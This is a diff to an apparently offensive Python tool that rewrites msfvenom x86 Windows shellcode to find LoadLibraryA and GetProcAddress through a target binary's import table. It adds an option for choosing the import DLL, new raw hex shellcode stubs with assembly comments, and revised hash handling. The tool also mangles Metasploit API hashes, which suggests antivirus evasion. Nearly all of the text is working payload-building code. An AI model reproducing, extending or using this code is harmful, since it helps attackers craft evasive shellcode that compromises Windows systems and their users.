@@ -45,6 +45,11 @@ parser.add_argument("-s", '--shellcode', default="", dest="code",
                     help="x86 Win Shellcode with Stephen Fewers Hash API prepended (from msfvenom) can be from stdin")
 parser.add_argument("-d", '--DLLName', default="", dest="dll", action="store",
                     help="If you know the DLL you are targeting enter this, no need for OS, DLL flags")
+parser.add_argument("-l", '--Import', default='kernel32.dll', dest='importname', action='store',
+                    help="""For use with -d and ExternGPA (-p), specify either 'kernel32.dll' or 
+'api-ms-win-core-libraryloader' -- you need to know with import you are targeting.
+To know, run without -d for a list of candidates. Default is kernel32.dll but not always right!
+                    """)
 parser.add_argument('-m', '--mangle', default=False, dest="mangle",
                     action="store_true", 
                     help="Mangle metasploit hash apis from their original values (you want to do this)")
@@ -344,7 +349,7 @@ class x86_windows_metasploit:
                "\x68\x4c\x69\x62\x72"           
                "\x68\x4c\x6f\x61\x64"           
                "\x54"                               # push esp
-               "\x53"                               # push ebx (kernerl32.dll handle)
+               "\x53"                               # push ebx (kernel32.dll handle)
                "\x89\xE9"                           # mov ecx,ebp getprocaddr
                "\xFF\x11"                           # call dword ptr [ecx]  # call dword ptr [ecx] 
                "\x50"                               # push eax ; LLA in EAX
@@ -389,7 +394,7 @@ class x86_windows_metasploit:
               , 'iso-8859-1')
 
         shellcode2 = b"\x81\xff"
-        shellcode2 += struct.pack("<I", self.DLL_HASH)
+        shellcode2 += struct.pack("<I", self.DLL_HASH['hash'])
     
         shellcode3 = bytes("\x8b\x5a\x10"           # mov ebx,[edx+0x10]
              "\x8b\x12"                             # mov edx,[edx]
@@ -483,7 +488,7 @@ class x86_windows_metasploit:
             , "iso-8859-1")
         
         shellcode2 = b"\x81\xff"                    # cmp edi, DLL_HASH
-        shellcode2 += struct.pack("<I", self.DLL_HASH)                          
+        shellcode2 += struct.pack("<I", self.DLL_HASH['hash'])                          
     
     
         shellcode3 = bytes("\x8b\x5a\x10"           # mov ebx,[edx+0x10]        ; move module handle addr to ebx
@@ -497,19 +502,26 @@ class x86_windows_metasploit:
             # findImport
             "\x8b\x57\x0c"                          # mov edx, dword ptr [edi + 0xc]        ;Offset for Import Directory Table Name RVA
             "\x03\xd3"                              # add edx, ebx                          ;Offset in memory
-            # Update put if statement here
-            #'''
-            #"\x81\x3a\x4b\x45\x52\x4e"              # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
-            #"\x75\x09"                              # JE short 
-            #"\x81\x7A\x04\x45\x4C\x33\x32"          # CMP DWORD PTR DS:[EDX+4],32334C45     ; el32
-            #"\x74\x05"                              # je 0x102f                             ; jmp saveBase
-            #'''
-            "\x81\x7A\x13\x72\x61\x72\x79"           # CMP DWORD PTR DS:[EDX+13],79726172   ; cmp rary
-            "\x75\x09"
-            "\x81\x7A\x18\x6F\x61\x64\x65"           # CMP DWORD PTR DS:[EDX+18],6564616F   ; cmp oade
-            "\x74\x05"
+            , 'iso-8859-1')                            
+        if self.DLL_HASH['importname'] == 'kernel32.dll':
+            shellcode3 += (
+           b"\x81\x3a\x4b\x45\x52\x4e"              # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
+           b"\x75\x09"                              # JE short 
+           b"\x81\x7A\x04\x45\x4C\x33\x32"          # CMP DWORD PTR DS:[EDX+4],32334C45     ; el32
+           b"\x74\x05"                              # je 0x102f                             ; jmp saveBase
+           )
+        elif 'api-ms-win-core-libraryloader' in self.DLL_HASH['importname'].lower():
+            shellcode3 += (
+          b"\x81\x7A\x13\x72\x61\x72\x79"           # CMP DWORD PTR DS:[EDX+13],79726172   ; cmp rary
+          b"\x75\x09"
+          b"\x81\x7A\x18\x6F\x61\x64\x65"           # CMP DWORD PTR DS:[EDX+18],6564616F   ; cmp oade
+          b"\x74\x05"
+          )
+        else:
+            sys.stderr.write('[!] What did you just pass to location (-l)? {0}\n'.format(self.importname))
+            sys.exit(-1)
 
-            "\x83\xc7\x14"                          # add edi, 0x14                         ;inc to next import
+        shellcode3 += bytes("\x83\xc7\x14"          # add edi, 0x14                         ;inc to next import
             "\xeb\xe4"                              # jmp 0x101d                            ;Jmp findImport
             # saveBase
             "\x57"                                  # push edi
@@ -519,12 +531,8 @@ class x86_windows_metasploit:
             "\x01\xda"                              # add edx,ebx
             "\x8b\x37"                              # mov esi,[edi]
             "\x01\xde"                              # add esi,ebx
-            "\x89\xd1"                              # mov ecx,edx
-            # this can be set based on the size of the .data section of the exploted binary or
-            # for the exploited DLL ... 0xff0000 for now.
-               
-            "\x81\xc1\x00\x00\xff\x00"              #  add ecx,0xff0000
-                        
+            "\x89\xd1"                              # mov ecx,edx   
+            "\x81\xc1\x00\x00\xff\x00"              #  add ecx,0xff0000     
             "\x31\xed"                              #  xor ebp,ebp
             # findApi           
             "\x8b\x06"                              #  mov eax,[esi]
@@ -582,7 +590,7 @@ class x86_windows_metasploit:
             "\x68\x4c\x69\x62\x72"              
             "\x68\x4c\x6f\x61\x64"              
             "\x54"                                  # push esp
-            "\x53"                                  # push ebx (kernerl32.dll handle)
+            "\x53"                                  # push ebx (kernel32.dll handle)
             "\x89\xE9"                              # mov ecx,ebp getprocaddr
             "\xFF\x11"                              # call dword ptr [ecx]  # call dword ptr [ecx] 
             "\x50"                                  # push eax ; LLA in EAX
@@ -632,7 +640,7 @@ class x86_windows_metasploit:
     ###############################    
 
     def get_hash(self, anumber):
-        sys.stderr.write("API HASH:{0}\n".format(anumber))
+        #sys.stderr.write("API HASH:{0}\n".format(anumber))
         for ahash in self.hashes:
             if hex(ahash[0]) == anumber:
                 self.called_apis.append(ahash[1])
@@ -791,26 +799,33 @@ class x86_windows_metasploit:
 
                 dllfound = False
                 getprocaddress_dll = False
-
+                gpa_dll_location = ''
                 for key, value in all_dlls_dict.items():
-                    if ntpath.basename(key.lower()) in blacklist:
-                        continue
+                    #if ntpath.basename(key.lower()) in blacklist:
+                    #    continue
                     if dll.lower() == bytes(ntpath.basename(key.lower()), 'iso-8859-1'):
-                        if value['getprocaddress'] is True:
+                        if value['getprocaddress']:
                             if 'system32' in key.lower():
                                 getprocaddress_dll = True
-                                
+                                dll_location = value['getprocaddress']
                             elif 'program files' in key.lower():
                                 getprocaddress_dll = True
-
+                                dll_location = value['getprocaddress']
                             if getprocaddress_dll is True:
                                 sys.stderr.write("\t-- GetProcAddress will work with this imported DLL: {0}\n".format(key))
                                 self.hash(ntpath.basename(key.lower()))
-                                self.gpa_hash_dict[ntpath.basename(key.lower())] = self.DLL_HASH
+                                # hash and where this DLL came from
+                                if self.OS.lower() in ['win7', 'win8', 'win10']: 
+                                    dll_location = value['getprocaddress']
+                                else:
+                                    dll_location = 'kernel32.dll'
+                                self.gpa_hash_dict[ntpath.basename(key.lower())] = {'hash' : self.DLL_HASH, 
+                                                                                        'importname': dll_location
+                                                                                        }
                                 getprocaddress_dll = False
-
-                        if value['loadlibrarya'] is True and value['getprocaddress'] is True:
-
+                        
+                        # This check makes sure that lla and gpa are both in kernel32 for optimization purposes 
+                        if value['loadlibrarya'] and value['getprocaddress'] and value['loadlibrarya'] == value['getprocaddress']:
                             if 'system32' in key.lower():
                                 dllfound = True
                                 break
@@ -823,14 +838,22 @@ class x86_windows_metasploit:
                             #else:
                             #    dllfound = True
 
+
                 if dllfound is True:
                     #goodtogo[location][key] = value
                     sys.stderr.write("\t-- This imported DLL will work for LLA/GPA: {0}\n".format(key))
                     self.hash(ntpath.basename(key.lower()))
-                    self.lla_hash_dict[ntpath.basename(key.lower())] = self.DLL_HASH
+                    self.lla_hash_dict[ntpath.basename(key.lower())] = {'hash' : self.DLL_HASH, 
+                                                                        'importname': 'kernel32.dll'
+                                                                        }
                     
-            sys.stderr.write("[*] LLA/GPA binaries available: {0}\n".format(self.lla_hash_dict))
-            sys.stderr.write("[*] GPA binaries available: {0}\n".format(self.gpa_hash_dict))
+            sys.stderr.write("\n\n[*] LLA/GPA binaries available:\n")
+            for key, value in self.lla_hash_dict.items():
+                sys.stderr.write("--DLL: {0}\n\tHash: {1}, Import Name: {2}\n".format(key, hex(value['hash']), value['importname']))
+            sys.stderr.write("\n[*] GPA binaries available:\n")
+            for key, value in self.gpa_hash_dict.items():
+                sys.stderr.write("--DLL: {0}\n\tHash: {1}, Import Name: {2}\n".format(key, hex(value['hash']), value['importname']))
+            
             sys.stderr.write(("*" * 80) + "\n")
             
     def check_apis(self):
@@ -893,11 +916,15 @@ class x86_windows_metasploit:
             if self.parser_stub.lower() == 'GPA'.lower() or self.parser_stub.lower() == 'ExternGPA'.lower():
                 # set hash
                 self.hash(self.dll)
-                sys.stderr.write("[*] Using ExternGPA from {0} hash: {1}\n".format(self.dll, hex(self.DLL_HASH)))
+                self.DLL_HASH = {'hash': self.DLL_HASH, 'importname': self.importname}
+                sys.stderr.write("[*] Using ExternGPA from {0} hash: {1}, import name: {2}\n".format(self.dll, hex(self.DLL_HASH['hash']),
+                    self.DLL_HASH['importname']))
                 self.selected_payload = self.loaded_gpa_iat_parser_stub()
             elif self.parser_stub.lower() == 'ExternLLAGPA'.lower():
                 self.hash(self.dll)
-                sys.stderr.write("[*] Using ExternLLAGPA from {0} hash: {1}\n".format(self.dll, hex(self.DLL_HASH)))
+                self.DLL_HASH = {'hash': self.DLL_HASH, 'importname': 'kernel32.dll'}
+                sys.stderr.write("[*] Using ExternLLAGPA from {0} hash: {1}, import name: {2}\n".format(self.dll, hex(self.DLL_HASH['hash']),
+                    self.DLL_HASH['importname']))
                 self.selected_payload = self.loaded_lla_gpa_parser_stub()
         
         elif self.targetbinary !="":
@@ -916,12 +943,14 @@ class x86_windows_metasploit:
 
             elif self.lla_hash_dict != {} and self.parser_stub != 'ExternGPA':
                 DLL, self.DLL_HASH = random.choice(list(self.lla_hash_dict.items()))
-                sys.stderr.write("[!] Using ExternLLAGPA from {0}, hash: {1}\n".format(DLL, hex(self.DLL_HASH)))
+                sys.stderr.write("[!] Using ExternLLAGPA from {0}, hash: {1}, import name: {2}\n".format(DLL, hex(self.DLL_HASH['hash']), 
+                    self.DLL_HASH['importname']))
                 self.selected_payload = self.loaded_lla_gpa_parser_stub()
             
             elif self.gpa_hash_dict != dict():
                 DLL, self.DLL_HASH = random.choice(list(self.gpa_hash_dict.items()))
-                sys.stderr.write("[!] Using ExternGPA from {0}, hash {1}\n".format(DLL, hex(self.DLL_HASH)))
+                sys.stderr.write("[!] Using ExternGPA from {0}, hash {1}, hash {2}\n".format(DLL, hex(self.DLL_HASH['hash']), 
+                    self.DLL_HASH['importname']))
                 
                 self.selected_payload = self.loaded_gpa_iat_parser_stub()
                 # use that
